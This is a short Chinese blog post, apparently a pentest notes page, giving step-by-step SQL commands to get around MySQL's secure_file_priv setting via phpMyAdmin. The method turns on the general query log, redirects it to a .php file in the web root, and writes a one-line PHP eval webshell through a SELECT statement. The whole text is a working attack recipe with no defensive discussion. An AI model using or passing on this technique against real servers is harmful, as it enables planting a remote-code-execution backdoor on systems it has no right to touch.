# phpMyAdmin突破secure-file-priv写WebShell





1.查看`secure_file_priv`值
```bash
show global variables like '%secure_file_priv%';
# show global variables like '%secure%';

# 此开关默认为NULL：即不允许导入导出
# 没有具体值时：表示不对mysqld 的导入|导出做限制
# 值为/tmp/ ：表示限制mysqld 的导入|导出只能发生在/tmp/目录下
```

2.查询操作日志存放路径
```bash
show variables like 'general_log%';

# 操作日志默认也是关闭的
```

3.首先打开操作日志记录
```bash
set global general_log = 'ON';
```

4.设置操作记录日志路径(`前提是获取到了绝对路径`)
```bash
# set global general_log_file='路径地址';
# 选择网站的目录里面
set global general_log_file='D:\\phpstudy\\PHPTutorial\\WWW\\xx.php'
```

5.执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中，就可以getshell了
```bash
select '<?php @eval($_POST[1]);?>';
```

6.访问webshell，进行后续操作














---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/phpmyadmin%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99webshell/  

